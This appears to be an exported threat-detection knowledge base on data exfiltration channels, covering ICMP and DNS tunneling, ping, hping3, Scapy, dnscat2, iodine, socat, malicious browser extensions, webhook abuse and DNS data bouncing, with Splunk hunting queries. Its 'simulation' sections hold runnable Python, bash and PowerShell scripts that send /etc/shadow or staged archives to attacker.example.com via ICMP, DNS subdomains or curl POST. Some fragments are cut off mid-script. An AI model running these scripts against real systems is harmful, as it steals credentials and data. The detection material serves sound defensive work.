name: ICMP Exfiltration / C2 Tunneling
overview:
ICMP (Internet Control Message Protocol) exfiltration abuses the data payload field of ICMP Echo Request/Reply packets (ping) to covertly exfiltrate data or establish a bidirectional C2 channel. Because ICMP operates at Layer 3 (network layer) and is not TCP/UDP, many firewalls and DLP solutions permit ICMP outbound without inspection. Maze ransomware, APT groups and red teams all use ICMP tunneling. Data is chunked, optionally XOR/AES-encrypted, and embedded in the payload field of type-8 (echo request) packets. The receiving attacker server reconstructs the data from successive packets. A full bidirectional C2 channel can be established where commands travel in ICMP echo-reply payloads back to the victim.

PACKET STRUCTURE (ICMP Echo Request – RFC 792):

  [IP HEADER — 20 bytes]
    Protocol: 0x01 (ICMP)
    Src: victim → Dst: attacker

  [ICMP HEADER — 8 bytes]
    Type:       0x08 Echo Request / 0x00 Echo Reply
    Code:       0x00
    Checksum:   2 bytes
    Identifier: 2 bytes ← session/chunk ID (icmpsh uses 0x0000)
    Sequence:   2 bytes ← packet counter

  [PAYLOAD — variable]
    Legit ping:  32-64 bytes (OS default)
    Exfil abuse: up to 65507 bytes per packet
    Contents:    encoded/encrypted data chunk
    Tools may prefix with magic bytes (ptunnel: 0x45525200)

EXFILTRATION TECHNIQUES:
  1. Payload stuffing – raw or XOR-encoded data in echo request payload
  2. Sequence number abuse – data encoded in identifier/sequence fields (2 bytes per packet)
  3. ICMP tunnel – full bidirectional TCP-over-ICMP (ptunnel, icmpsh)
  4. Type/Code field steganography – custom type values carry covert data
  5. Fragmentation abuse – oversized payloads trigger IP fragmentation hiding data in fragments

simulation_examples.description: Python raw socket: Custom minimal ICMP exfil script (detectable via raw socket creation)
simulation_examples.command:
import socket, struct, os, time

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
    s = (s >> 16) + (s & 0xffff); return ~s & 0xffff

def send_icmp_exfil(dst, chunk, seq):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # Build ICMP header: type=8, code=0, id=0xBEEF (tool fingerprint), seq=N
    header = struct.pack('!BBHHH', 8, 0, 0, 0xBEEF, seq)
    payload = chunk  # raw data bytes
    chk = checksum(header + payload)
    header = struct.pack('!BBHHH', 8, 0, chk, 0xBEEF, seq)
    sock.sendto(header + payload, (dst, 0))
    sock.close()

# Exfiltrate file
data = open('/etc/shadow', 'rb').read()
for i, seq in enumerate(range(0, len(data), 1400)):
    send_icmp_exfil('attacker.example.com', data[seq:seq+1400], i)
    time.sleep(0.05)

name: DNS Exfiltration / C2 Tunneling
overview:
DNS exfiltration abuses the Domain Name System — the most universally permitted outbound protocol — to covertly transfer data or establish a C2 channel. Because virtually every firewall allows UDP/TCP port 53 outbound, DNS is the most reliable covert channel in restricted networks. Data is encoded (base32, base64, hex) and embedded in DNS query subdomains or record responses. The attacker controls an authoritative DNS server for their domain, receiving every query as it traverses the DNS resolver chain — no direct connection to the attacker IP is needed.

HOW DNS EXFILTRATION WORKS:
  Victim endpoint → Recursive resolver → Authoritative NS (attacker-controlled)
  The victim never contacts the attacker directly. Queries transit corporate DNS
  infrastructure, making blocking harder without breaking DNS resolution.

DNS PACKET STRUCTURE (RFC 1035):

  [DNS HEADER — 12 bytes]
    ID:      2 bytes  — session ID reused by tunnel tools
    Flags:   2 bytes  — QR|Opcode|AA|TC|RD|RA|Z|RCODE
    QDCOUNT: 2 bytes  — number of questions
    ANCOUNT: 2 bytes  — number of answers
    NSCOUNT/ARCOUNT: 2+2 bytes

  [QUESTION SECTION — DATA HIDDEN HERE]
    QNAME:  variable length ← base32-encoded data chunks
      Label format: [1-byte length][chars] ... [0x00]
      Max label:    63 chars per label
      Max FQDN:     253 chars total
      Usable/query: ~180-200 chars of encoded data
    QTYPE:  2 bytes  — A=1, TXT=16, MX=15, CNAME=5, NULL=10
    QCLASS: 2 bytes  — IN=1

  [ANSWER SECTION — C2 commands attacker→victim]
    TXT record:   up to 255 bytes per string, multi-string
    NULL record:  raw binary, no encoding overhead
    A record:     4 bytes — IP used as command signal
    CNAME:        another encoded label

EXFILTRATION ENCODING TECHNIQUES:
  1. Subdomain label stuffing  — base32(data).seq.attacker.com
     e.g. MFRA===.001.t.attacker.com → decodes to 'data'
  2. TXT record queries        — query type TXT, attacker returns encoded C2 cmd
  3. NULL record tunnel        — raw binary in NULL RR (iodine uses this)
  4. Multiple label chaining   — 63char.63char.63char.attacker.com = ~189 bytes/query
  5. CNAME chain               — each CNAME hop carries one encoded label
  6. MX record abuse           — data encoded in MX preference values
  7. Hex encoding              — 3032 3433...attacker.com (less efficient, more detectable)
  8. DNS-over-HTTPS (DoH)      — tunnels DNS through HTTPS, bypasses DNS monitoring

THROUGHPUT:
  Subdomain exfil: ~100–200 bytes/query × rate-limited to avoid detection
  iodine benchmark: ~2–10 Kbps sustainable throughput
  dnscat2 C2: ~1–5 Kbps (interactive shell is usable)
  DNS-over-HTTPS tunnel: limited by HTTPS request rate, not DNS packet size

THREAT ACTOR USAGE:
  APT groups using DNS C2: APT32, Lazarus Group, OilRig (APT34), Cobalt Group,
  TA505, FIN7, Sofacy/Fancy Bear, Turla (extensively), EquationGroup
  Malware families: SUNBURST (SolarWinds), Cobalt Strike DNS beacon,
  HEXANE/SpyNote, DNSMessenger, FrameworkPOS, PoisonIvy, Ursnif/Gozi

simulation_examples.description: Linux: Manual base32 DNS exfil using nslookup — encode /etc/shadow line by line
simulation_examples.command:
# ATTACKER SIDE: run authoritative DNS server capturing queries
# tcpdump -i eth0 port 53 -w dns_capture.pcap

# VICTIM SIDE: encode and exfil via DNS subdomain queries
# Each chunk: 60 chars base32 = ~37 bytes of raw data per query
ATTACKER='t.attacker.example.com'
SEQ=0
cat /etc/shadow | gzip | base32 | tr -d '=' | tr '[:lower:]' '[:upper:]' | \
  fold -w 60 | while read chunk; do
    SEQ=$(printf '%04d' $SEQ)
    # Query format: SEQ.CHUNK.t.attacker.example.com
    nslookup "${SEQ}.${chunk}.${ATTACKER}" > /dev/null 2>&1
    SEQ=$((SEQ+1))
    sleep 0.2  # Rate limit to avoid detection
done

# RECONSTRUCT on attacker (from tcpdump pcap):
tshark -r dns_capture.pcap -T fields -e dns.qry.name 2>/dev/null | \
  grep -E '^[0-9]{4}\.' | sort | \
  sed 's/^[0-9]\{4\}\.//' | sed 's/\.t\.attacker.*//' | \
  tr -d '\n' | base32 -d | gunzip

# PowerShell AES-encrypted DNS exfiltration
$key = 'ExfilAESKey12345'  # 16-byte AES key
$domain = 't.attacker.example.com'
$data = [IO.File]::ReadAllBytes('C:\staging\exfil.zip')

# AES-encrypt the data
$aes = [Security.Cryptography.Aes]::Create()
$aes.Key = [Text.Encoding]::UTF8.GetBytes($key)
$aes.GenerateIV()
$enc = $aes.CreateEncryptor()
$ms = New-Object IO.MemoryStream
$cs = New-Object Security.Cryptography.CryptoStream $ms,$enc,'Write'
$cs.Write($data,0,$data.Length); $cs.Close()
$encrypted = $ms.ToArray()

  Resolve-DnsName -Name $query -Type TXT -ErrorAction SilentlyContinue | Out-Null
  $seq++; Start-Sleep -Milliseconds 200
}

name: ping / ping6
overview:
The ubiquitous network diagnostic tool — present on every OS by default — can be weaponised for data exfiltration by encoding data in the ICMP echo-request payload field. On Linux, the -p flag accepts a hex pattern to use as the 16-byte payload, sending exactly that data in the ICMP body. By scripting successive ping calls with different hex chunks, an attacker sends an entire file one 8-byte chunk at a time. On Windows, the -l flag controls payload size (up to 65500 bytes), allowing a large file to be sent in a single oversized ICMP packet. Because ping is a built-in OS binary and ICMP is almost universally permitted outbound, this technique is effective in highly restricted environments where all other egress is blocked.

See protocol reference: ICMP Exfiltration / C2 Tunneling

name: hping3
overview:
hping3 is an advanced packet crafting tool that gives full control over ICMP, TCP, UDP and raw IP packets. Unlike ping, hping3 can inject arbitrary data files directly into ICMP payloads, set custom type/code fields, control fragmentation, and flood at high rates. Attackers use it to exfiltrate data by writing a file's contents into successive ICMP packets with --file, or by manipulating TCP/IP header fields (ISN, seq, ack) to encode data covertly. hping3 is the de-facto red team tool for ICMP and protocol-level data exfiltration testing.

See protocol reference: ICMP Exfiltration / C2 Tunneling

name: Scapy (ICMP exfil)
overview:
Scapy is a powerful Python packet crafting and manipulation library that enables construction of arbitrary ICMP (and any other protocol) packets with full control over every field. It is the most flexible ICMP exfil tool available — attackers write custom Python scripts that read a file, encode it, chunk it, and send each chunk in the payload field of crafted ICMP echo-request packets using raw sockets. Scapy-based exfil is harder to fingerprint than named tools like icmpsh because each script is unique — detection must focus on the raw socket creation and ICMP payload anomalies rather than tool name.

See protocol reference: ICMP Exfiltration / C2 Tunneling

#!/usr/bin/env python3
# Requires: pip install scapy; run as root
from scapy.all import IP, ICMP, send, conf
import base64, time

TARGET = 'attacker.example.com'
CHUNK_SIZE = 1400  # bytes per ICMP packet

# Read and encode file
data = base64.b64encode(open('/etc/shadow', 'rb').read())
chunks = [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]

print(f'Sending {len(chunks)} ICMP packets to {TARGET}')
for seq, chunk in enumerate(chunks):
    pkt = IP(dst=TARGET) / ICMP(type=8, id=0xBEEF, seq=seq) / chunk
    send(pkt, verbose=0)
    time.sleep(0.05)

print('Exfil complete')

name: icmpsh
overview:
icmpsh is a simple reverse ICMP shell — the slave component runs on the victim (Windows), sending cmd.exe output in ICMP echo-request payloads to the attacker's handler (Python script on Linux). Commands from the attacker arrive in ICMP echo-reply payloads. The entire C2 channel operates over ICMP with no TCP/UDP connections — ideal for networks that block all TCP/UDP egress but permit ICMP. The identifier field is set to 0x0000 in all packets — a reliable fingerprint. Actively used by threat actors; documented in multiple ransomware intrusions.

See protocol reference: ICMP Exfiltration / C2 Tunneling

name: ptunnel-ng
overview:
ptunnel-ng (PingTunnel Next Generation) creates a full TCP-over-ICMP tunnel, allowing any TCP-based protocol (SSH, HTTP, SMB, RDP) to traverse ICMP-only firewall rules. The proxy component runs on the attacker's server; the client runs on the victim and forwards a local TCP port through ICMP to the proxy. Every TCP packet is wrapped in an ICMP echo payload with a 4-byte magic signature (0x45525200). ptunnel-ng requires a password for authentication, adds sequence numbers for reliability, and supports multiple concurrent connections over a single ICMP session.

See protocol reference: ICMP Exfiltration / C2 Tunneling

name: dnscat2
overview:
dnscat2 (by Ron Bowes) is an encrypted DNS C2 tunnel providing interactive shell, file transfer and port forwarding capabilities entirely over DNS queries. Data travels outbound in DNS query subdomains (TXT, A, CNAME record types) and commands return in DNS answer sections. All traffic is encrypted with a pre-shared secret. dnscat2 requires the attacker to control an authoritative DNS NS record for their domain — all queries for *.attacker.com route through the attacker's server regardless of corporate DNS. Throughput is ~1-5 Kbps — slow but extremely persistent and difficult to block without breaking DNS resolution.

See protocol reference: DNS Exfiltration / C2 Tunneling

name: iodine
overview:
iodine tunnels IP traffic over DNS by creating a virtual TUN network interface. The iodined server runs on the attacker's DNS server and assigns tunnel IPs; the client runs on the victim. Once established, the tunnel carries full IP traffic — SSH, HTTP, anything. iodine negotiates the best available DNS record type: NULL > TXT > CNAME > MX > A (NULL gives highest throughput as it carries raw binary). The initial version handshake sends a query with a 'z' prefix followed by the protocol version hex — a definitive detection fingerprint.

See protocol reference: DNS Exfiltration / C2 Tunneling

simulation_examples.description: Linux: exfiltrate /etc/shadow using nslookup base32 subdomain loop
simulation_examples.command:
# ATTACKER: run tcpdump or authoritative DNS server to capture queries
# VICTIM:
TARGET='t.attacker.example.com'
SEQ=0
# Compress, base32-encode, chunk into 60-char labels
gzip -c /etc/shadow | base32 | tr -d '=\n' | fold -w 60 | \
  while read chunk; do
    nslookup "$(printf '%04d' $SEQ).${chunk}.${TARGET}" > /dev/null 2>&1
    SEQ=$((SEQ+1))
    sleep 0.2
  done

# RECONSTRUCT (attacker, from pcap or resolver log):
# 1. Extract subdomains in order: sort by 4-digit prefix
# 2. Strip prefix and domain suffix
# 3. Concatenate all chunks
# 4. base32 -d | gunzip

simulation_examples.description: Windows PowerShell: Resolve-DnsName exfil loop (no third-party tools)
simulation_examples.command:
$domain = 't.attacker.example.com'
$key    = 'ExfilKey123'         # optional AES key
$data   = [IO.File]::ReadAllBytes('C:\staging\exfil.zip')
$b32    = [Convert]::ToBase64String($data) -replace '[/+=]',''
$chunks = $b32 -split '(.{55})' | ? {$_}
$i = 0
foreach ($c in $chunks) {
  $q = '{0:D4}.{1}.{2}' -f $i, $c, $domain
  Resolve-DnsName $q -Type A -DnsOnly -ErrorAction SilentlyContinue | Out-Null
  $i++
  Start-Sleep -Milliseconds 300
}
Write-Host "Sent $i DNS chunks"

# Detect: Windows Event 4104 captures this entire script block
# DNS: resolver logs show burst of 4-digit.base64.t.attacker.example.com queries

  while read h; do ping -c1 -p "$h" attacker.example.com; sleep 0.1; done

# Base32 encode for DNS exfil (see DNS protocol page):
base32 /etc/shadow | tr -d '=\n' | fold -w 60 | \
  while read c; do nslookup "${c}.t.attacker.example.com"; done

# HTTP: base64 in curl POST body
base64 -w 0 /etc/shadow | curl -X POST -d @- https://attacker.example.com/collect

name: socat
overview: socat (SOcket CAT) is a bidirectional data relay tool — a significantly more powerful version of netcat. It supports TCP, UDP, Unix sockets, TLS/SSL, files, stdin/stdout, and exec. Attackers use it to exfiltrate files over raw TCP, establish encrypted TLS tunnels for data transfer, create reverse shells, and relay data between protocols. The `OPENSSL` address type creates a full TLS-encrypted channel bypassing proxy inspection. Present on many Linux systems and easily installable.

socat EXEC reverse shell — spawns process and attaches to remote TCP

name: Malicious / Compromised Browser Extension
overview:
Browser extensions run with elevated browser-level privileges and persistent background access to every page a user visits — making them one of the most dangerous and under-monitored exfil vectors. Attackers deploy malicious extensions through three main vectors: (1) publishing fake productivity tools, (2) supply-chain compromise — pushing a malicious update to a previously clean extension after buying or phishing the developer account, and (3) enterprise software bundling. Once installed, extensions can silently read DOM content of every page, intercept HTTP requests/responses, access cookies and session tokens, keylog form inputs, and exfiltrate to attacker C2 via the browser's own network stack — bypassing endpoint DLP tools that have no visibility into in-browser activity.

REAL-WORLD INCIDENTS:
  Dec 2024: Cyberhaven supply chain attack — 35+ extensions compromised, 3.7M+ users affected.
  Feb 2025: GitLab Threat Intelligence — 16 extensions exfiltrating HTTP headers and DOM content.
  Mid 2025: ShadyPanda campaign — 100+ Chrome/Edge extensions, hourly RCE framework, 2.3M users.
  Jan 2026: Fake AI extensions (ChatGPT/DeepSeek impersonators) — 900K users, conversations stolen.

EXTENSION CAPABILITIES (by permission):
  tabs / activeTab        → read all page content, URLs, navigation history
  cookies                 → steal session tokens, bypass MFA
  webRequest/declarative  → intercept/modify all HTTP requests and responses
  storage                 → persist stolen data locally before exfil
  background/service_worker → persistent C2 polling loop
  scripting/executeScript → inject code into any page

See also: https://github.com/mthcht/awesome-lists/blob/main/Lists/Browser%20Extensions/browser_extensions_list.csv
For C2 frameworks abusing legitimate services including browsers: https://lolc2.github.io

name: Webhook Exfiltration (Discord / Slack / Teams)
overview:
Webhook URLs are pre-authenticated HTTPS POST endpoints exposed by collaboration platforms (Discord, Slack, Microsoft Teams, GitHub, etc.) that allow any HTTP client to deliver messages to a channel without OAuth. Attackers abuse them as exfiltration channels: a webhook URL embedded in malware or a script allows stolen credentials, screenshots, keylogger output, and file contents to be delivered directly to an attacker-controlled Discord/Slack channel over HTTPS to a trusted platform domain — bypassing DLP that allowlists these services.

Discord webhooks are by far the most abused — used in hundreds of documented infostealers, RATs and credential stealers. The webhook URL acts as a built-in C2 endpoint: no server infrastructure needed, traffic blends with legitimate Discord HTTPS, and the message delivery API supports file attachments up to 25 MB.

WEBHOOK ABUSE PATTERN:
  1. Attacker creates Discord server, creates webhook URL for a channel
  2. Webhook URL embedded in malware/script: https://discord.com/api/webhooks/<id>/<token>
  3. Victim endpoint calls webhook with stolen data as POST body or file attachment
  4. Data appears in attacker's Discord channel — no server infrastructure exposed

PLATFORMS ABUSED:
  Discord:   POST /api/webhooks/<id>/<token>  (most common — infostealers)
  Slack:     POST /services/<T>/<B>/<token>   (corporate targeting)
  Teams:     POST https://<org>.webhook.office.com/webhookb2/<uuid>
  GitHub:    Webhook deliveries for code exfil via push events
  Telegram:  Bot API sendMessage/sendDocument endpoint

For a comprehensive list of webhook-abusing C2 frameworks see: https://lolc2.github.io

overview: Open-source out-of-band interaction server by ProjectDiscovery that captures DNS, HTTP, and SMTP callbacks. In a data bouncing context it serves as the exfiltration collector — chunked data encoded in DNS subdomains arrives here after trusted intermediary servers unknowingly perform hostname lookups on attacker-crafted headers. name: DataBouncing Bouncer (N1ckDunn Python)
overview: Python-based data bouncing exfiltration sender from the original DataBouncing PoC toolkit by Nick Dunn. The Bouncer script encrypts a file, chunks it into DNS-label-safe segments with sequence numbers, then sends each chunk embedded as a subdomain in HTTP headers (Host, X-Forwarded-For, Referer) to randomly selected trusted domains. Those trusted servers unknowingly perform DNS lookups on the crafted hostnames, delivering the data to an attacker-controlled DNS listener (typically Interactsh or Burp Collaborator). Works with companion scripts: Recruiter (identifies viable bounce targets), Dentist (extracts usable hosts), and Therapist (reassembles exfiltrated file from DNS logs).
telemetry_overview: Proxy / firewall HTTP logs showing requests with unusual headers
DNS query logs for encoded subdomain patterns
Command-line audit logs capturing script arguments

Look for bouncer.py invocations with -e (exfil domain), -f (file to exfiltrate), and -u (unique ID) flags.

detailed_artifacts.notes: JSON files from the DNS listener containing captured interactions — Therapist reads these to reassemble the exfiltrated file.

detailed_artifacts.notes: Bouncer sends HTTP to randomly selected trusted domains; the headers contain attacker-controlled subdomains with encrypted data chunks. The destination is legitimate — the exfil is in the header.
Queries triggered by trusted servers resolving crafted hostnames from Bouncer. Subdomain labels contain sequence-numbered encrypted chunks that can be decoded to recover the exfiltrated file.

name: DNS Data Bouncing / Indirect Exfiltration
overview:
Data bouncing is an indirect exfiltration method that abuses trusted third-party web servers as unwitting DNS relay proxies. Unlike traditional DNS exfiltration — where the victim host directly queries an attacker-controlled authoritative nameserver — data bouncing inserts exfil data into HTTP headers (Host, X-Forwarded-For, Referer) of requests sent to legitimate, high-reputation domains. When those trusted servers process the request, their infrastructure performs a DNS lookup on the attacker-crafted hostname embedded in the header. This lookup delivers the data to the attacker's DNS listener. The victim network only sees outbound HTTP to trusted destinations (google.com, adobe.com, github.com) — the exfiltration happens as a second-order DNS query initiated by the trusted server, entirely outside the victim's network perimeter.

HOW DATA BOUNCING WORKS:
  Victim  ──HTTP──▶  Trusted Domain (google.com)
                      │
                      ├─ processes Host header: chunk01.exfil.attacker.com
                      ├─ CDN / analytics / logging triggers DNS lookup
                      │
                      └──DNS──▶  Attacker's DNS Listener (Interactsh / Collaborator)
                                  └─ captures subdomain = exfil data chunk

WHY IT DEFEATS TRADITIONAL DEFENSES:
  • Domain-level blocking is useless — destinations are trusted, business-critical domains
  • DNS monitoring at the victim network sees nothing — the DNS query is made by the trusted server
  • DLP / proxy inspection sees legitimate HTTP to legitimate domains
  • Protocol morphing: TCP HTTP → UDP DNS — the exfil changes protocol mid-flight
  • No direct connection between victim and attacker infrastructure
  • Related to CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')

DATA ENCODING IN DNS LABELS:
  • Each DNS label: max 63 characters, FQDN max 253 characters
  • Typical encoding: hex or base64url of encrypted file chunks
  • Format: seqnum.hexchunk.identifier.exfil.attacker.com
  • Usable bandwidth: ~30-60 bytes of raw data per HTTP request/bounce
  • File chunking: 1KB file ≈ 17-34 bounced requests

DATA BOUNCING VARIANTS:
  1. Host header bouncing — primary method, most reliable for triggering lookups
  2. X-Forwarded-For header — analytics and CDN systems resolve these
  3. Referer header — many services log and resolve referer domains
  4. Link preview bouncing — messaging platforms fetch and resolve URLs
  5. Email address bouncing — MX lookups on crafted email domains

ATTACKER REQUIREMENTS:
  • DNS listener: Interactsh (public or self-hosted), Burp Collaborator, dnslog.cn, ceye.io, or custom NS
  • List of bounce-capable trusted domains (identified via Recruiter scripts)
  • Sender script: Bouncer (Python), NightCrawler (PowerShell), or custom curl/wget loop
  • Reassembly tool: Therapist (Python), DeadPool (PowerShell), or custom DNS log parser

THROUGHPUT:
  • Dependent on: chunk size per bounce, delay between requests, number of trusted intermediaries
  • Typical: 30-60 bytes per bounce × 5-10 bounces/sec = 150-600 bytes/sec
  • With multi-URL distribution (NightCrawler): chunks spread across N domains, harder to detect but same aggregate throughput
  • Sufficient for documents, credentials, keys — not designed for bulk database exfil

KEY DIFFERENCE FROM TRADITIONAL DNS EXFIL:
  Traditional DNS exfil: victim → DNS resolver → attacker NS (visible in victim's DNS logs)
  Data bouncing: victim → trusted HTTP server → trusted server's DNS → attacker NS (invisible in victim's DNS logs)
  The critical distinction is that the DNS query carrying the data originates from the trusted server, NOT from the victim network.

detailed_artifacts.notes:
The primary detection surface. Look for:
• Host header value that does NOT match the destination domain
• Host header containing hex/base64-encoded strings (e.g. 4a6f686e.0001.abc123.oast.fun)

Splunk query:
index=proxy sourcetype=squid OR sourcetype=bluecoat
| eval host_header=coalesce(cs_host, http_host)
| eval dest_domain=coalesce(dest_host, dest_ip)
| where host_header!=dest_domain
| regex host_header="[a-f0-9]{20,}|[A-Za-z0-9+/]{20,}"
| stats count by src_ip, dest_domain, host_header

detailed_artifacts.path: TLS SNI field vs HTTP Host header comparison
detailed_artifacts.notes:
When TLS inspection is deployed, compare:
• TLS Client Hello SNI = trusted-domain.com (legitimate)
• Decrypted HTTP Host header = hexdata.exfil.oast.fun (exfil)
This mismatch is the canonical data bouncing fingerprint.
Note: Without TLS inspection, only the SNI is visible and looks entirely legitimate.

detailed_artifacts.path: Traffic pattern analysis — burst HTTP to diverse destinations
detailed_artifacts.notes:
Behavioral detection (no content inspection required):
• Single host → 50+ unique trusted domains in < 5 minutes
• Each request is small (GET or HEAD), minimal response body
• Requests are sequential with consistent inter-request timing (~200ms)
• Destination domains are all high-reputation (Alexa/Tranco top 10K)
This pattern is anomalous for any normal user or application.

IMPORTANT: In a data bouncing attack, the victim's DNS logs will NOT show the exfil queries.
The DNS queries are made by the trusted server, not the victim.
Victim DNS logs will only show:
• A record lookups for the trusted domains (google.com, adobe.com, etc.) — entirely normal
• NO queries to oast.*, oastify.com, or attacker domains
This is what makes data bouncing fundamentally harder to detect than traditional DNS exfil.

• curl, wget, python3, powershell making HTTP to diverse trusted domains with custom headers
• Invoke-WebRequest or Invoke-RestMethod with -Headers parameter containing non-standard values
• File read followed by encoding activity (base64, hex) followed by HTTP burst
• PowerShell Event ID 4104 containing 'NightCrawler', 'Bouncer', 'oast.', 'oastify'
• Python process importing 'requests' and iterating over a domain list file

On the attacker collection side, each captured DNS query contains:
• Correlation ID (maps to Interactsh session)
• Sequence number (chunk ordering)
• Hex/base64 encoded data chunk
• Source IP of the trusted server that performed the lookup (NOT the victim)
Forensic recovery: if you can obtain the attacker's DNS logs, chunks can be reassembled and decrypted.

simulation_examples.description: Multi-header data bouncing — distribute chunks across Host, X-Forwarded-For, and Referer
simulation_examples.command:
# Each request bounces 3 chunks through 3 different header positions
HEADERS=("Host" "X-Forwarded-For" "Referer")
DOMAINS=("google.com" "adobe.com" "github.com")
OOB="abc123.oast.fun"
SEQ=0

cat secret.txt | xxd -p | fold -w 40 | while read chunk; do
  HDR=${HEADERS[$((SEQ % 3))]}
  DST=${DOMAINS[$((RANDOM % 3))]}
  curl -s -o /dev/null -H "${HDR}: ${SEQ}.${chunk}.${OOB}" "https://${DST}"
  SEQ=$((SEQ + 1))
  sleep 0.3
done

simulation_examples.description: Blue Team: Detect data bouncing via proxy log analysis — Host header mismatch hunt
simulation_examples.command:
# Splunk query: find HTTP where Host header doesn't match destination
index=proxy sourcetype=squid
| eval host_header=lower(cs_host)
| eval dest=lower(dest_host)
| where host_header!=dest AND isnotnull(host_header)
| regex host_header="(oast\.|oastify|burpcollaborator|interact\.sh|dnslog\.cn|ceye\.io)"
| stats count values(dest) as trusted_domains dc(dest) as domain_count by src_ip host_header
| where count > 5
| sort -count

# Alternative: hunt for encoded subdomains in Host headers
index=proxy
| regex cs_host="^[a-f0-9]{20,}\.[a-z0-9]+\.[a-z0-9.-]+$"
| stats count by src_ip cs_host sc_dst_host
| where cs_host!=sc_dst_host

name: Pipedream (programmable HTTP webhook platform)

name: Canarytokens (DNS/HTTP callback tokens)
overview: Free digital tripwire service by Thinkst (canarytokens.org) that generates unique DNS hostnames and HTTP URLs which trigger alerts when resolved or accessed. Two core callback mechanisms: DNS tokens (*.canarytokens.com) fire on hostname resolution, and HTTP tokens (URLs on canarytokens.org or *.o3n.io) fire on HTTP access. In an exfiltration context, the DNS token mechanism can be repurposed as a lightweight data exfil collector — data encoded as subdomains prepended to a Canarytoken FQDN will be captured when resolved, either directly or via data bouncing through trusted intermediaries. HTTP tokens capture the requester's IP and request details. Canarytokens can also be embedded in Word docs, Excel files, PDFs, MySQL dumps, AWS API keys, WireGuard configs, and more — all triggering DNS/HTTP callbacks on access. Open-source (github.com/thinkst/canarytokens) and self-hostable. Listed in standard SIEM OAST detection rule sets alongside Interactsh and Burp Collaborator domains.

name: webhook.site (instant HTTP/DNS webhook collector)
overview: Free web-based HTTP and DNS request inspection service that instantly generates a unique URL (webhook.site/TOKEN-UUID) and DNS subdomain for capturing incoming requests with full headers, body, query parameters, and source IP. No account required — an endpoint is ready in seconds. In an exfiltration context, attackers POST stolen data directly to the webhook URL or use the DNS subdomain for data bouncing via encoded subdomain labels. Explicitly named in MITRE ATT&CK T1567.004 (Exfiltration Over Webhook) alongside Discord and Slack. Heavily abused in real-world campaigns: APT28 (Fancy Bear) used webhook.site as both C2 and exfil infrastructure in Operation MacroMaze (2025-2026) targeting European entities; info-stealers like Hazard-Token-Grabber-V2 exfiltrate credentials and system info via JSON POST to webhook.site; and malicious npm/PyPI packages use it for supply chain exfiltration. MITRE ATT&CK detection strategy DET0153 specifically covers webhook.site exfiltration patterns.
telemetry_overview: Proxy / firewall HTTP logs for connections to webhook.site
DNS query logs for *.dnshook.site or webhook.site subdomains

detailed_artifacts.notes: webhook.site captures all HTTP methods (GET, POST, PUT, etc.) with full headers, body, and query parameters. Exfil data typically arrives as JSON POST body, base64-encoded form data, or URL path parameters. Token UUIDs are in standard UUID4 format.
webhook.site provides DNS callback subdomains under dnshook.site. Data encoded in subdomain labels is captured when resolved — same mechanism as Interactsh/dnslog.cn.

detailed_artifacts.notes: Look for curl, wget, Invoke-WebRequest, Python requests, or Edge/Chrome headless mode commands targeting webhook.site. APT28 used Edge headless to exfiltrate command output via HTML form submission to webhook.site.
